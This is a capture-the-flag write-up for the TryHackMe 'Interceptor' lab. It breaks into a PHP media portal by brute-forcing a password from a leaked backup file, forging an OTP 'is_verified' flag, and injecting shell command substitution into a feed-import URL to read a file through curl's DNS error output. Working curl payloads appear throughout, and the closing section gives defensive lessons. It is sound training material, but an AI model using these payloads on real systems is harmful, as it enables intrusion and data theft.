# Interceptor (TryHackMe)

Room: Interceptor (Jr Penetration Tester → Jr Pentester Challenges) — "use Burp / interception to
modify traffic and pwn the machine."
Completed: 2026-10-29 | Target: <ip> (MediaHub portal) | Tools: curl, Python requests.
Solved headless from the Windows PC over the THM OpenVPN tunnel — no Burp GUI; every "interception"
was just a crafted request/response with `curl`/`requests`.

## Answers

| # | Question | Answer |
|---|---|---|
| 1 | Flag value after logging in as admin | `THM{…}` |
| 2 | Value of `/var/www/user.txt` | `THM{…}` |

## The app

`MediaHub`, PHP on `Apache/2.4.41 (Ubuntu)`. Any unknown path is catch-all'd to the 1491-byte
homepage, so GET enumeration is useless — real files are the ones whose response differs. Real
surface: `login.php`, `api_login.php` (POST), `otp.php`, `verify_otp.php`, `dashboard.php`,
`logout.php`, `import_feed_api.php`, plus a leaked backup `login.php.bak`.

Auth flow: `login.php` → `POST api_login.php` → on success `{"ok":true,...,"redirect":"otp.php"}`
→ `otp.php` (6-digit 2FA) → `POST verify_otp.php` → `dashboard.php`.

## Chain

### 1. Source leak → admin credentials
Fuzzing for backups (filter out the 1491-byte catch-all) found `login.php.bak` (2038 bytes). It
contained a "temporary" developer note:

```
Admin test account for staging environment
Email: admin@mediahub.thm
Admin password follows company format: MediaHub + any year
```

Brute the year against `api_login.php`:

```bash
for y in $(seq 1990 2035); do
  curl -s --data-urlencode "email=admin@mediahub.thm" \
          --data-urlencode "password=MediaHub$y" \
          http://<ip>/api_login.php | grep -q Invalid || echo "HIT $y"
done
# -> <redacted-pw>  =>  {"ok":true,"message":"Login success. OTP required.","redirect":"otp.php"}
```

### 2. OTP (2FA) bypass — client-trusted verification flag
`verify_otp.php` echoes an `is_verified` field in its JSON, and the page comment even says the UI
"show[s] only message/error on DOM". The server trusts a client-supplied parameter: send
`is_verified=true` with any OTP and it marks the session verified.

```bash
# log in, keep the session cookie, then:
curl -s -b cj.txt --data-urlencode "otp=000000" --data-urlencode "is_verified=true" \
     http://<ip>/verify_otp.php
# -> {"ok":true,"message":"OTP verified. Redirecting..."}
curl -s -b cj.txt http://<ip>/dashboard.php   # 200 -- admin dashboard
```

The dashboard banner carries **Flag 1 = `THM{…}`** (Role: admin, Verified: Yes).

### 3. Import Feed → command injection → read user.txt
The dashboard's "Import Feed" posts a `url` to `import_feed_api.php`; the server runs roughly
`curl "$url"` and returns stdout/stderr in a `cmd_output` field. The client strips `;`, `&`, `|`
from the URL — **client-side only**, bypassed by posting directly.

Server-side guards: scheme must be `http(s)` (`file://` → "Invalid URL") and the host can't be
private (`127.0.0.1` → "Private network access blocked"). But command substitution inside the
double-quoted argument still fires:

```bash
curl -s -b cj.txt --data-urlencode 'url=http://example.com/$(id)' \
     http://<ip>/import_feed_api.php
# -> cmd_output: curl: (6) Could not resolve host: gid=33(www-data)...
```

The substitution result lands in curl's "Could not resolve host:" error. Reading the file directly
dropped the `{ }` (invalid hostname chars), so I encoded it (the `|` pipe is filtered server-side,
so pass the file as a direct argument — no pipe):

```bash
url=http://$(xxd${IFS}-p${IFS}/var/www/user.txt).x/
# host = <redacted-hash>  ->  hex-decodes to:
#   THM{…}
# cross-checked with base64 /var/www/user.txt -> same value
```

**Flag 2 = `THM{…}`** (`/var/www/user.txt`), confirmed by two encodings.

## Lessons

- **Client-side controls are decoration.** Both wins were client-only guards: the OTP step trusted
  a request parameter (`is_verified=true`), and the feed importer's `;&|` filter lived in browser JS.
  Posting straight to the API ignores both. "Interception" here = just forging the request.
- **Leaked `.bak` files are gold.** `login.php.bak` handed over the admin email and password format;
  always fuzz `*.bak`/`*~`/`*.old` and filter by response length when a 404 is masked as 200.
- **Blind command injection exfil via DNS errors.** When injected output only surfaces in curl's
  `Could not resolve host:` line, hostnames silently drop characters like `{` and `}`. Encode the
  payload (`xxd -p`, `base64`) so nothing is lost — and pass the file as an argument when the pipe
  character is filtered.
- **Defense:** server-side validate every security decision (verify OTP against server state, never
  a client flag); never shell out with user input — use an allowlisted HTTP client / `escapeshellarg`
  and block `file://`, substitution, and metacharacters on the server, not in JS.
